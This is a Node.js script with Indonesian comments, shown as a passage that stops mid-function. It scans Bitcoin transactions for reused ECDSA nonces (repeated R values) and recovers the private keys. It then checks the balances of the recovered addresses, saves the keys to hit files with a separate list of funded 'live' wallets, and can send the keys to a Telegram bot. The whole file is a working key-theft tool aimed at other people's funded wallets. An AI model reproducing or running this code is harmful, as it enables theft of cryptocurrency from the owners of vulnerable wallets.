#!/usr/bin/env node
import { secp256k1 } from "@noble/curves/secp256k1";
import { sha256 } from "@noble/hashes/sha256";
import { ripemd160 } from "@noble/hashes/ripemd160";
import { readFileSync, appendFileSync, writeFileSync, existsSync, mkdirSync, rmSync } from "node:fs";
import { createInterface } from "node:readline/promises";
import { stdin as input, stdout as output } from "node:process";

// ============================================================
// Config (config.json di root, semua field opsional)
// ============================================================
const CONFIG_FILE = "config.json";
const DEFAULT_CONFIG = {
  api: "https://mempool.space/api",
  concurrency: 8,
  hitsFile: "hits.txt",
  cache: { enabled: true, listMaxAgeHours: 6 },
  telegram: { enabled: false, botToken: "", chatId: "", notifyOnLiveOnly: true },
};
function loadConfig() {
  if (!existsSync(CONFIG_FILE)) return DEFAULT_CONFIG;
  try {
    const raw = JSON.parse(readFileSync(CONFIG_FILE, "utf8"));
    return {
      ...DEFAULT_CONFIG,
      ...raw,
      cache: { ...DEFAULT_CONFIG.cache, ...(raw.cache || {}) },
      telegram: { ...DEFAULT_CONFIG.telegram, ...(raw.telegram || {}) },
    };
  } catch (e) {
    console.error("Peringatan: config.json tidak valid (" + e.message + "), pakai default.");
    return DEFAULT_CONFIG;
  }
}
const CONFIG = loadConfig();
const DEFAULT_API = CONFIG.api;

// ============================================================
// Utilitas hex/bytes
// ============================================================
const hexToBytes = (h) => {
  h = h.replace(/^0x/, "").replace(/\s+/g, "").toLowerCase();
  if (h.length % 2) throw new Error("Hex panjangnya harus genap");
  const out = new Uint8Array(h.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(h.substr(i * 2, 2), 16);
  return out;
};
const bytesToHex = (b) =>
  Array.from(b).map((x) => x.toString(16).padStart(2, "0")).join("");
const concat = (...arr) => {
  const total = arr.reduce((s, a) => s + a.length, 0);
  const out = new Uint8Array(total);
  let o = 0;
  for (const a of arr) {
    out.set(a, o);
    o += a.length;
  }
  return out;
};
const reverseBytes = (b) => {
  const out = new Uint8Array(b.length);
  for (let i = 0; i < b.length; i++) out[i] = b[b.length - 1 - i];
  return out;
};
const dsha256 = (b) => sha256(sha256(b));
const hash160 = (b) => ripemd160(sha256(b));

const N = secp256k1.CURVE.n;
const mod = (a, m = N) => ((a % m) + m) % m;
const invMod = (a, m = N) => {
  // Fermat / extended Euclid via BigInt
  let [old_r, r] = [a, m];
  let [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  if (old_r !== 1n) throw new Error("Tidak ada invers modular");
  return mod(old_s, m);
};

// ============================================================
// Parse DER signature  ->  {r, s, sighashType}
// Format: 0x30 [len] 0x02 [rLen] [r] 0x02 [sLen] [s] [sighashType]
// ============================================================
function parseDER(sig) {
  if (sig[0] !== 0x30) throw new Error("DER tidak valid: byte awal bukan 0x30");
  const totalLen = sig[1];
  if (sig[2] !== 0x02) throw new Error("DER tidak valid: marker R");
  const rLen = sig[3];
  const r = sig.slice(4, 4 + rLen);
  const sMarker = 4 + rLen;
  if (sig[sMarker] !== 0x02) throw new Error("DER tidak valid: marker S");
  const sLen = sig[sMarker + 1];
  const s = sig.slice(sMarker + 2, sMarker + 2 + sLen);
  const sighashType = sig[sMarker + 2 + sLen]; // boleh undefined
  return {
    r: BigInt("0x" + bytesToHex(r)),
    s: BigInt("0x" + bytesToHex(s)),
    rHex: bytesToHex(r).replace(/^00/, ""),
    sHex: bytesToHex(s).replace(/^00/, ""),
    sighashType,
    derLen: 2 + totalLen,
  };
}

// ============================================================
// Parser script sederhana: ekstrak push-data
// ============================================================
function parseScriptPushes(script) {
  const pushes = [];
  let i = 0;
  while (i < script.length) {
    const op = script[i++];
    if (op >= 0x01 && op <= 0x4b) {
      pushes.push(script.slice(i, i + op));
      i += op;
    } else if (op === 0x4c) {
      const l = script[i++];
      pushes.push(script.slice(i, i + l));
      i += l;
    } else if (op === 0x4d) {
      const l = script[i] | (script[i + 1] << 8);
      i += 2;
      pushes.push(script.slice(i, i + l));
      i += l;
    } else if (op === 0x4e) {
      const l =
        script[i] |
        (script[i + 1] << 8) |
        (script[i + 2] << 16) |
        (script[i + 3] << 24);
      i += 4;
      pushes.push(script.slice(i, i + l));
      i += l;
    }
    // opcode lain diabaikan
  }
  return pushes;
}

// ============================================================
// VarInt
// ============================================================
function readVarInt(buf, off) {
  const f = buf[off];
  if (f < 0xfd) return { value: f, size: 1 };
  if (f === 0xfd)
    return { value: buf[off + 1] | (buf[off + 2] << 8), size: 3 };
  if (f === 0xfe)
    return {
      value:
        buf[off + 1] |
        (buf[off + 2] << 8) |
        (buf[off + 3] << 16) |
        (buf[off + 4] << 24),
      size: 5,
    };
  // 0xff -> 8 byte
  let v = 0n;
  for (let i = 0; i < 8; i++) v |= BigInt(buf[off + 1 + i]) << BigInt(8 * i);
  return { value: Number(v), size: 9 };
}
function writeVarInt(n) {
  if (n < 0xfd) return new Uint8Array([n]);
  if (n <= 0xffff) return new Uint8Array([0xfd, n & 0xff, (n >> 8) & 0xff]);
  if (n <= 0xffffffff)
    return new Uint8Array([
      0xfe,
      n & 0xff,
      (n >> 8) & 0xff,
      (n >> 16) & 0xff,
      (n >> 24) & 0xff,
    ]);
  const out = new Uint8Array(9);
  out[0] = 0xff;
  let v = BigInt(n);
  for (let i = 0; i < 8; i++) {
    out[1 + i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}
function u32le(n) {
  return new Uint8Array([
    n & 0xff,
    (n >> 8) & 0xff,
    (n >> 16) & 0xff,
    (n >> 24) & 0xff,
  ]);
}
function u64le(n) {
  const out = new Uint8Array(8);
  let v = BigInt(n);
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

// ============================================================
// Parse raw Bitcoin transaction (legacy & segwit)
// ============================================================
function parseTx(buf) {
  let off = 0;
  const version =
    buf[off] | (buf[off + 1] << 8) | (buf[off + 2] << 16) | (buf[off + 3] << 24);
  off += 4;

  let hasWitness = false;
  if (buf[off] === 0x00 && buf[off + 1] === 0x01) {
    hasWitness = true;
    off += 2;
  }

  const vinCount = readVarInt(buf, off);
  off += vinCount.size;
  const vin = [];
  for (let i = 0; i < vinCount.value; i++) {
    const prevTxid = buf.slice(off, off + 32);
    off += 32;
    const prevVout =
      buf[off] |
      (buf[off + 1] << 8) |
      (buf[off + 2] << 16) |
      (buf[off + 3] << 24);
    off += 4;
    const sLen = readVarInt(buf, off);
    off += sLen.size;
    const scriptSig = buf.slice(off, off + sLen.value);
    off += sLen.value;
    const sequence =
      buf[off] |
      (buf[off + 1] << 8) |
      (buf[off + 2] << 16) |
      (buf[off + 3] << 24);
    off += 4;
    vin.push({
      prevTxid,
      prevVout,
      scriptSig,
      sequence,
      witness: [],
    });
  }

  const voutCount = readVarInt(buf, off);
  off += voutCount.size;
  const vout = [];
  for (let i = 0; i < voutCount.value; i++) {
    const value = buf.slice(off, off + 8);
    off += 8;
    const sLen = readVarInt(buf, off);
    off += sLen.size;
    const scriptPubKey = buf.slice(off, off + sLen.value);
    off += sLen.value;
    vout.push({ value, scriptPubKey });
  }

  if (hasWitness) {
    for (let i = 0; i < vin.length; i++) {
      const wCount = readVarInt(buf, off);
      off += wCount.size;
      for (let j = 0; j < wCount.value; j++) {
        const wLen = readVarInt(buf, off);
        off += wLen.size;
        vin[i].witness.push(buf.slice(off, off + wLen.value));
        off += wLen.value;
      }
    }
  }

  const locktime =
    buf[off] | (buf[off + 1] << 8) | (buf[off + 2] << 16) | (buf[off + 3] << 24);
  off += 4;

  return { version, hasWitness, vin, vout, locktime };
}

// ============================================================
// Hitung sighash legacy (SIGHASH_ALL = 0x01) untuk satu input
//   Untuk P2PKH: scriptCode = scriptPubKey input asal (0x76a914<hash160>88ac)
// ============================================================
function legacySighash(tx, inputIndex, scriptCode, sighashType = 0x01) {
  const parts = [];
  parts.push(u32le(tx.version));
  parts.push(writeVarInt(tx.vin.length));
  for (let i = 0; i < tx.vin.length; i++) {
    const vi = tx.vin[i];
    parts.push(vi.prevTxid);
    parts.push(u32le(vi.prevVout));
    if (i === inputIndex) {
      parts.push(writeVarInt(scriptCode.length));
      parts.push(scriptCode);
    } else {
      parts.push(writeVarInt(0));
    }
    parts.push(u32le(vi.sequence));
  }
  parts.push(writeVarInt(tx.vout.length));
  for (const vo of tx.vout) {
    parts.push(vo.value);
    parts.push(writeVarInt(vo.scriptPubKey.length));
    parts.push(vo.scriptPubKey);
  }
  parts.push(u32le(tx.locktime));
  parts.push(u32le(sighashType));
  const pre = concat(...parts);
  return dsha256(pre);
}

// ============================================================
// Sighash BIP143 (segwit v0, P2WPKH/P2SH-P2WPKH)
// ============================================================
function bip143Sighash(tx, inputIndex, scriptCode, amount, sighashType = 0x01) {
  const hashPrevouts = dsha256(
    concat(...tx.vin.map((v) => concat(v.prevTxid, u32le(v.prevVout))))
  );
  const hashSequence = dsha256(
    concat(...tx.vin.map((v) => u32le(v.sequence)))
  );
  const hashOutputs = dsha256(
    concat(
      ...tx.vout.map((o) =>
        concat(o.value, writeVarInt(o.scriptPubKey.length), o.scriptPubKey)
      )
    )
  );
  const vi = tx.vin[inputIndex];
  const pre = concat(
    u32le(tx.version),
    hashPrevouts,
    hashSequence,
    vi.prevTxid,
    u32le(vi.prevVout),
    writeVarInt(scriptCode.length),
    scriptCode,
    u64le(amount),
    u32le(vi.sequence),
    hashOutputs,
    u32le(tx.locktime),
    u32le(sighashType)
  );
  return dsha256(pre);
}

// ============================================================
// Bitcoin Base58Check encoding (untuk address P2PKH)
// ============================================================
const B58 =
  "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58Encode(bytes) {
  let n = 0n;
  for (const b of bytes) n = (n << 8n) | BigInt(b);
  let s = "";
  while (n > 0n) {
    s = B58[Number(n % 58n)] + s;
    n /= 58n;
  }
  for (const b of bytes) {
    if (b === 0) s = "1" + s;
    else break;
  }
  return s;
}
function p2pkhAddress(hash160Bytes, prefix = 0x00) {
  const v = concat(new Uint8Array([prefix]), hash160Bytes);
  const checksum = dsha256(v).slice(0, 4);
  return base58Encode(concat(v, checksum));
}

// ============================================================
// Recovery private key dari R-reuse
//   Rumus: k = (z1 - z2) / (s1 - s2)  mod n
//          d = (s1*k - z1) / r        mod n
// ============================================================
function recoverPrivateKey(r, s1, z1, s2, z2) {
  const rs = [];
  // Coba kombinasi tanda untuk k karena s/-s ekuivalen
  for (const sa of [s1, mod(-s1)]) {
    for (const sb of [s2, mod(-s2)]) {
      try {
        const num = mod(z1 - z2);
        const den = mod(sa - sb);
        if (den === 0n) continue;
        const k = mod(num * invMod(den));
        const d = mod((sa * k - z1) * invMod(r));
        if (d === 0n) continue;
        rs.push({ k, d });
      } catch {}
    }
  }
  return rs;
}

// ============================================================
// Format output
// ============================================================
const padHex = (n, len = 64) =>
  n.toString(16).padStart(len, "0");
const C = {
  reset: "\x1b[0m",
  bold: "\x1b[1m",
  dim: "\x1b[2m",
  red: "\x1b[31m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  cyan: "\x1b[36m",
  magenta: "\x1b[35m",
};
const useColor = process.stdout.isTTY && !process.env.NO_COLOR;
const c = (col, s) => (useColor ? col + s + C.reset : s);
const sep = (t = "") =>
  console.log(c(C.dim, "─".repeat(8)) + " " + c(C.bold, t) + " " + c(C.dim, "─".repeat(Math.max(0, 60 - t.length))));

// ============================================================
// Analisis transaksi
// ============================================================
async function analyzeTx(rawHex, opts = {}) {
  const buf = hexToBytes(rawHex);
  const tx = parseTx(buf);
  console.log(c(C.bold, "\n=== Analisis Transaksi Bitcoin ==="));
  console.log("Versi        :", tx.version);
  console.log("Jumlah input :", tx.vin.length);
  console.log("Jumlah output:", tx.vout.length);
  console.log("Locktime     :", tx.locktime);
  console.log("SegWit       :", tx.hasWitness ? "Ya" : "Tidak");

  const sigs = [];

  for (let i = 0; i < tx.vin.length; i++) {
    const vi = tx.vin[i];
    sep(`Input #${i}`);
    console.log(
      "Prev TXID :",
      c(C.cyan, bytesToHex(reverseBytes(vi.prevTxid)))
    );
    console.log("Prev Vout :", vi.prevVout);

    // P2PKH legacy: scriptSig = <sig> <pubkey>
    let pushes = parseScriptPushes(vi.scriptSig);
    let isWitness = false;
    if (pushes.length < 2 && vi.witness.length >= 2) {
      pushes = vi.witness;
      isWitness = true;
    }
    if (pushes.length < 2) {
      console.log(c(C.yellow, "  (Tidak ada signature+pubkey yang dapat dibaca otomatis pada input ini)"));
      continue;
    }
    const sigBytes = pushes[0];
    const pubBytes = pushes[1];
    let parsed;
    try {
      parsed = parseDER(sigBytes);
    } catch (e) {
      console.log(c(C.red, "  Gagal parse DER: " + e.message));
      continue;
    }
    const pubHash = hash160(pubBytes);
    const addr = p2pkhAddress(pubHash);

    console.log("Tipe       :", isWitness ? "P2WPKH (witness)" : "P2PKH/legacy (scriptSig)");
    console.log("Public Key :", c(C.magenta, bytesToHex(pubBytes)));
    console.log("PubKey Hash:", c(C.magenta, bytesToHex(pubHash)));
    console.log("Address    :", c(C.green, addr));
    console.log("Signature  :", c(C.dim, bytesToHex(sigBytes)));
    console.log("  R        :", c(C.yellow, padHex(parsed.r)));
    console.log("  S        :", c(C.yellow, padHex(parsed.s)));
    console.log(
      "  Sighash  :",
      "0x" + (parsed.sighashType ?? 1).toString(16).padStart(2, "0")
    );

    // Hitung Z (message hash)
    let z = null;
    try {
      // scriptCode P2PKH/P2WPKH (sama-sama OP_DUP OP_HASH160 <20> <pkh> OP_EQUALVERIFY OP_CHECKSIG)
      const scriptCode = concat(
        new Uint8Array([0x76, 0xa9, 0x14]),
        pubHash,
        new Uint8Array([0x88, 0xac])
      );
      const sht = parsed.sighashType ?? 1;
      if (isWitness) {
        const amount = opts.amounts?.[i];
        if (amount === undefined) {
          console.log(
            c(
              C.yellow,
              "  Z        : (perlu --amount " +
                i +
                "=<satoshi> untuk hitung sighash BIP143)"
            )
          );
        } else {
          const h = bip143Sighash(tx, i, scriptCode, amount, sht);
          z = BigInt("0x" + bytesToHex(h));
          console.log("  Z (msg)  :", c(C.yellow, bytesToHex(h)));
        }
      } else {
        const h = legacySighash(tx, i, scriptCode, sht);
        z = BigInt("0x" + bytesToHex(h));
        console.log("  Z (msg)  :", c(C.yellow, bytesToHex(h)));
      }
    } catch (e) {
      console.log(c(C.red, "  Gagal hitung Z: " + e.message));
    }

    sigs.push({
      index: i,
      r: parsed.r,
      s: parsed.s,
      z,
      pubkey: bytesToHex(pubBytes),
      pubkeyHash: bytesToHex(pubHash),
      address: addr,
    });
  }

  detectReuse(sigs);
}

// ============================================================
// Deteksi R-reuse lintas signature
// ============================================================
async function detectReuse(sigs, opts = {}) {
  sep("Deteksi R-reuse");
  const hitsFile = opts.hitsFile || "hits.txt";
  const groups = new Map();
  for (const s of sigs) {
    const key = padHex(s.r);
    if (!groups.has(key)) groups.set(key, []);
    groups.get(key).push(s);
  }
  let found = false;
  let hitCount = 0;
  const recovered = [];
  for (const [r, list] of groups) {
    if (list.length < 2) continue;
    found = true;
    console.log(c(C.red, `\n!! R berulang ditemukan pada R = ${r}`));
    console.log("   Tanda tangan terkait:");
    for (const s of list) {
      console.log(
        `   - input #${s.index}  tx ${s.txid ? s.txid.slice(0, 16) + "…" : "(manual)"}  pubkey ${s.pubkey.slice(0, 16)}…`
      );
    }
    const seenPriv = new Set();
    for (let i = 0; i < list.length; i++) {
      for (let j = i + 1; j < list.length; j++) {
        const a = list[i], b = list[j];
        if (a.z === null || b.z === null) {
          console.log(c(C.yellow, "   (lewati: Z belum diketahui, sediakan --amount untuk segwit)"));
          continue;
        }
        const cands = recoverPrivateKey(a.r, a.s, a.z, b.s, b.z);
        for (const { k, d } of cands) {
          try {
            const dHex = padHex(d);
            if (seenPriv.has(dHex)) continue;
            const pubCompressed = secp256k1.getPublicKey(hexToBytes(dHex), true);
            const pubUncompressed = secp256k1.getPublicKey(hexToBytes(dHex), false);
            const pubCHex = bytesToHex(pubCompressed);
            const pubUHex = bytesToHex(pubUncompressed);
            if (pubCHex === a.pubkey || pubUHex === a.pubkey ||
                pubCHex === b.pubkey || pubUHex === b.pubkey) {
              seenPriv.add(dHex);
              hitCount++;
              const matchedPub = (pubCHex === a.pubkey || pubCHex === b.pubkey) ? pubCHex : pubUHex;
              const addrCompressed = p2pkhAddress(hash160(pubCompressed));
              const addrUncompressed = p2pkhAddress(hash160(pubUncompressed));
              const wifC = toWIF(d, 0x80, true);
              const wifU = toWIF(d, 0x80, false);
              console.log(c(C.green, "\n   ✓ PRIVATE KEY DIPULIHKAN"));
              console.log("     k (nonce)         :", c(C.magenta, padHex(k)));
              console.log("     d (priv hex)      :", c(C.green + C.bold, dHex));
              console.log("     WIF (compressed)  :", c(C.green, wifC));
              console.log("     WIF (uncompressed):", c(C.green, wifU));
              console.log("     Pubkey cocok      :", matchedPub);
              console.log("     Address (comp)    :", c(C.green + C.bold, addrCompressed));
              console.log("     Address (uncomp)  :", c(C.green + C.bold, addrUncompressed));

              recovered.push({
                ts: new Date().toISOString(),
                scannedAddress: opts.scannedAddress || null,
                privHex: dHex,
                wifCompressed: wifC,
                wifUncompressed: wifU,
                pubkey: matchedPub,
                addressCompressed: addrCompressed,
                addressUncompressed: addrUncompressed,
                r: padHex(a.r),
                txids: [a.txid, b.txid].filter(Boolean),
                inputs: [a.index, b.index],
              });
            }
          } catch {}
        }
      }
    }
  }
  if (!found) {
    console.log(c(C.green, "Tidak ada R-reuse terdeteksi."));
    return [];
  }
  // Cek saldo otomatis untuk setiap address yang dipulihkan
  if (recovered.length && opts.checkBalance !== false) {
    const base = opts.api || DEFAULT_API;
    console.log(c(C.bold, "\nMengecek saldo " + (recovered.length * 2) + " address di " + base + "…"));
    for (const h of recovered) {
      const [bC, bU] = await Promise.all([
        fetchAddressBalance(base, h.addressCompressed),
        fetchAddressBalance(base, h.addressUncompressed),
      ]);
      h.balanceCompressed = bC;
      h.balanceUncompressed = bU;
      const liveC = bC.balanceSat && bC.balanceSat > 0;
      const liveU = bU.balanceSat && bU.balanceSat > 0;
      const tag = (liveC || liveU) ? c(C.green + C.bold, " *** ADA SALDO ***") : "";
      console.log(c(C.dim, "  " + h.addressCompressed + " (comp)  ") +
        (bC.balanceSat == null ? c(C.red, "error") :
         (bC.balanceSat > 0 ? c(C.green + C.bold, formatBTC(bC.balanceSat)) : c(C.dim, "0 BTC")) +
         c(C.dim, "  total diterima: " + formatBTC(bC.totalReceivedSat) + ", " + bC.txCount + " tx")) +
        tag);
      console.log(c(C.dim, "  " + h.addressUncompressed + " (uncmp) ") +
        (bU.balanceSat == null ? c(C.red, "error") :
         (bU.balanceSat > 0 ? c(C.green + C.bold, formatBTC(bU.balanceSat)) : c(C.dim, "0 BTC")) +
         c(C.dim, "  total diterima: " + formatBTC(bU.totalReceivedSat) + ", " + bU.txCount + " tx")));
    }

    // Notifikasi Telegram (jika diaktifkan di config.json)
    if (CONFIG.telegram.enabled) {
      const onlyLive = CONFIG.telegram.notifyOnLiveOnly !== false;
      const targets = onlyLive
        ? recovered.filter((h) =>
            (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
            (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0))
        : recovered;
      for (const h of targets) {
        const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
        const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
        const tag = (liveC || liveU) ? "🚨 *WALLET HIDUP DITEMUKAN*" : "🔑 *Private key dipulihkan*";
        const lines = [
          tag,
          h.scannedAddress ? "Scan: `" + h.scannedAddress + "`" : null,
          "Priv (hex): `" + h.privHex + "`",
          "WIF (comp): `" + h.wifCompressed + "`",
          "Addr (comp): `" + h.addressCompressed + "`" +
            (h.balanceCompressed && h.balanceCompressed.balanceSat > 0
              ? " — *" + formatBTC(h.balanceCompressed.balanceSat) + "*" : ""),
          "Addr (uncmp): `" + h.addressUncompressed + "`" +
            (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0
              ? " — *" + formatBTC(h.balanceUncompressed.balanceSat) + "*" : ""),
          "TXID: " + (h.txids || []).slice(0, 4).map((t) => "`" + t.slice(0, 16) + "…`").join(", "),
        ].filter(Boolean);
        await notifyTelegram(lines.join("\n"));
      }
    }
  }

  if (recovered.length && opts.saveHits !== false) {
    try {
      const lines = [];
      for (const h of recovered) {
        const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
        const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
        const banner = (liveC || liveU) ? "  *** WALLET MASIH ADA SALDO ***" : "";
        lines.push("==========================================================" + banner);
        lines.push("Waktu              : " + h.ts);
        if (h.scannedAddress) lines.push("Address yang di-scan: " + h.scannedAddress);
        lines.push("Private key (hex)  : " + h.privHex);
        lines.push("WIF (compressed)   : " + h.wifCompressed);
        lines.push("WIF (uncompressed) : " + h.wifUncompressed);
        lines.push("Public key         : " + h.pubkey);
        lines.push("Address compressed : " + h.addressCompressed);
        if (h.balanceCompressed) {
          lines.push("  Saldo            : " + formatBTC(h.balanceCompressed.balanceSat));
          lines.push("  Total diterima   : " + formatBTC(h.balanceCompressed.totalReceivedSat));
          lines.push("  Jumlah tx        : " + h.balanceCompressed.txCount);
        }
        lines.push("Address uncompress : " + h.addressUncompressed);
        if (h.balanceUncompressed) {
          lines.push("  Saldo            : " + formatBTC(h.balanceUncompressed.balanceSat));
          lines.push("  Total diterima   : " + formatBTC(h.balanceUncompressed.totalReceivedSat));
          lines.push("  Jumlah tx        : " + h.balanceUncompressed.txCount);
        }
        lines.push("R reuse value      : " + h.r);
        lines.push("TXID terkait       : " + h.txids.join(", "));
        lines.push("");
      }
      appendFileSync(hitsFile, lines.join("\n"));
      const jsonFile = hitsFile.replace(/\.txt$/, "") + ".jsonl";
      appendFileSync(jsonFile, recovered.map((h) => JSON.stringify(h)).join("\n") + "\n");
      console.log(c(C.green + C.bold, "\n>> " + recovered.length + " hit disimpan ke: " + hitsFile + " (dan " + jsonFile + ")"));

      // File khusus wallet hidup
      const live = recovered.filter((h) =>
        (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
        (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0));
      if (live.length) {
        const liveFile = hitsFile.replace(/\.txt$/, "") + "_LIVE.txt";
        const liveLines = [];
        for (const h of live) {
          liveLines.push("==========================================================  *** WALLET MASIH ADA SALDO ***");
          liveLines.push("Waktu              : " + h.ts);
          if (h.scannedAddress) liveLines.push("Address yang di-scan: " + h.scannedAddress);
          liveLines.push("Private key (hex)  : " + h.privHex);
          liveLines.push("WIF (compressed)   : " + h.wifCompressed);
          liveLines.push("WIF (uncompressed) : " + h.wifUncompressed);
          liveLines.push("Public key         : " + h.pubkey);
          liveLines.push("Address compressed : " + h.addressCompressed);
          if (h.balanceCompressed) {
            liveLines.push("  Saldo            : " + formatBTC(h.balanceCompressed.balanceSat));
            liveLines.push("  Total diterima   : " + formatBTC(h.balanceCompressed.totalReceivedSat));
            liveLines.push("  Jumlah tx        : " + h.balanceCompressed.txCount);
          }
          liveLines.push("Address uncompress : " + h.addressUncompressed);
          if (h.balanceUncompressed) {
            liveLines.push("  Saldo            : " + formatBTC(h.balanceUncompressed.balanceSat));
            liveLines.push("  Total diterima   : " + formatBTC(h.balanceUncompressed.totalReceivedSat));
            liveLines.push("  Jumlah tx        : " + h.balanceUncompressed.txCount);
          }
          liveLines.push("R reuse value      : " + h.r);
          liveLines.push("TXID terkait       : " + h.txids.join(", "));
          liveLines.push("");
        }
        appendFileSync(liveFile, liveLines.join("\n"));
        console.log(c(C.green + C.bold, ">> " + live.length + " wallet HIDUP juga disalin ke: " + liveFile));
      }
    } catch (e) {
      console.log(c(C.red, "Gagal menulis hits file: " + e.message));
    }
  }
  return recovered;
}

// ============================================================
// Telegram notification (opsional, dari config.json)
// ============================================================
async function notifyTelegram(text) {
  const t = CONFIG.telegram;
  if (!t || !t.enabled || !t.botToken || !t.chatId) return;
  try {
    const url = "https://api.telegram.org/bot" + t.botToken + "/sendMessage";
    const r = await fetch(url, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        chat_id: t.chatId,
        text,
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      }),
    });
    if (!r.ok) {
      console.log(c(C.yellow, "Telegram gagal: HTTP " + r.status));
    } else {
      console.log(c(C.dim, "Telegram terkirim ke chat " + t.chatId));
    }
  } catch (e) {
    console.log(c(C.yellow, "Telegram error: " + e.message));
  }
}

// WIF (mainnet, compressed)
function toWIF(d, prefix = 0x80, compressed = true) {
  const key = hexToBytes(padHex(d));
  let payload = concat(new Uint8Array([prefix]), key);
  if (compressed) payload = concat(payload, new Uint8Array([0x01]));
  const checksum = dsha256(payload).slice(0, 4);
  return base58Encode(concat(payload, checksum));
}

// ============================================================
// Mode manual: analisis langsung dari R, S, Z, [pubkey]
// ============================================================
async function analyzeManual(items) {
  console.log(c(C.bold, "\n=== Analisis Manual (R, S, Z) ==="));
  const sigs = items.map((it, i) => {
    const r = BigInt("0x" + it.r.replace(/^0x/, ""));
    const s = BigInt("0x" + it.s.replace(/^0x/, ""));
    const z = BigInt("0x" + it.z.replace(/^0x/, ""));
    let pubHex = it.pubkey || null;
    let pubHash = null,
      addr = null;
    if (pubHex) {
      const pb = hexToBytes(pubHex);
      pubHash = bytesToHex(hash160(pb));
      addr = p2pkhAddress(hash160(pb));
    }
    sep(`Sig #${i}`);
    console.log("R :", c(C.yellow, padHex(r)));
    console.log("S :", c(C.yellow, padHex(s)));
    console.log("Z :", c(C.yellow, padHex(z)));
    if (pubHex) {
      console.log("Public Key :", c(C.magenta, pubHex));
      console.log("PubKey Hash:", c(C.magenta, pubHash));
      console.log("Address    :", c(C.green, addr));
    }
    return { index: i, r, s, z, pubkey: pubHex, pubkeyHash: pubHash, address: addr };
  });
  await detectReuse(sigs);
}

// ============================================================
// Esplora API client
// ============================================================
async function esploraFetch(base, path) {
  const url = base + path;
  const r = await fetch(url);
  if (!r.ok) throw new Error("HTTP " + r.status + " " + url);
  const ct = r.headers.get("content-type") || "";
  return ct.includes("json") ? r.json() : r.text();
}

const CACHE_DIR = ".btc-cache";
const CACHE_TX = CACHE_DIR + "/tx";
const CACHE_LIST = CACHE_DIR + "/addr";
let CACHE_ENABLED = CONFIG.cache.enabled;
let CACHE_STATS = { hexHits: 0, hexMisses: 0, listHits: 0, listMisses: 0 };

function ensureCacheDir() {
  if (!existsSync(CACHE_DIR)) mkdirSync(CACHE_DIR);
  if (!existsSync(CACHE_TX)) mkdirSync(CACHE_TX);
  if (!existsSync(CACHE_LIST)) mkdirSync(CACHE_LIST);
}

async function fetchTxHexCached(base, txid) {
  if (CACHE_ENABLED) {
    const file = CACHE_TX + "/" + txid + ".hex";
    if (existsSync(file)) {
      CACHE_STATS.hexHits++;
      return readFileSync(file, "utf8").trim();
    }
  }
  CACHE_STATS.hexMisses++;
  const hex = await esploraFetch(base, "/tx/" + txid + "/hex");
  if (CACHE_ENABLED) {
    try { ensureCacheDir(); writeFileSync(CACHE_TX + "/" + txid + ".hex", hex); } catch {}
  }
  return hex;
}

function loadAddressListCache(address) {
  if (!CACHE_ENABLED) return null;
  const file = CACHE_LIST + "/" + address + ".json";
  if (!existsSync(file)) return null;
  try {
    const data = JSON.parse(readFileSync(file, "utf8"));
    if (data && Array.isArray(data.txs) && typeof data.ts === "number") return data;
  } catch {}
  return null;
}

function saveAddressListCache(address, txs) {
  if (!CACHE_ENABLED) return;
  try {
    ensureCacheDir();
    writeFileSync(CACHE_LIST + "/" + address + ".json",
      JSON.stringify({ ts: Date.now(), address, txs }));
  } catch {}
}

async function fetchAddressBalance(base, address) {
  try {
    const info = await esploraFetch(base, "/address/" + address);
    const cs = info.chain_stats || {};
    const ms = info.mempool_stats || {};
    const funded = (cs.funded_txo_sum || 0) + (ms.funded_txo_sum || 0);
    const spent = (cs.spent_txo_sum || 0) + (ms.spent_txo_sum || 0);
    const txCount = (cs.tx_count || 0) + (ms.tx_count || 0);
    return { balanceSat: funded - spent, totalReceivedSat: funded, txCount };
  } catch (e) {
    return { balanceSat: null, totalReceivedSat: null, txCount: null, error: e.message };
  }
}

function formatBTC(sats) {
  if (sats == null) return "?";
  const btc = Number(sats) / 1e8;
  return btc.toFixed(8) + " BTC (" + sats.toLocaleString("en-US") + " sat)";
}

async function fetchAllTxsForAddress(base, address) {
  const all = [];
  let lastSeen = null;
  while (true) {
    const path = lastSeen
      ? "/address/" + address + "/txs/chain/" + lastSeen
      : "/address/" + address + "/txs";
    const page = await esploraFetch(base, path);
    if (!Array.isArray(page) || page.length === 0) break;
    all.push(...page);
    if (page.length < 25) break;
    lastSeen = page[page.length - 1].txid;
  }
  return all;
}

function drawProgress(done, total, startTs, label) {
  if (label === undefined) label = "";
  const w = 30;
  const pct = total ? done / total : 0;
  const filled = Math.round(pct * w);
  const bar = "\u2588".repeat(filled) + "\u2591".repeat(w - filled);
  const elapsed = (Date.now() - startTs) / 1000;
  const rate = done / Math.max(elapsed, 0.001);
  const eta = rate > 0 ? Math.max(0, (total - done) / rate) : 0;
  const fmt = (s) => {
    if (!isFinite(s)) return "--";
    const m = Math.floor(s / 60), sec = Math.floor(s % 60);
    return m + "m" + String(sec).padStart(2, "0") + "s";
  };
  const line =
    "\r" + c(C.cyan, bar) + " " +
    c(C.bold, done + "/" + total) +
    " (" + (pct * 100).toFixed(1) + "%)  " +
    rate.toFixed(1) + "/dtk  ETA " + fmt(eta) +
    (label ? "  " + c(C.dim, label) : "") +
    "\x1b[K";
  process.stdout.write(line);
}

async function processTxForAddress(tx, address, base) {
  const ourInputs = [];
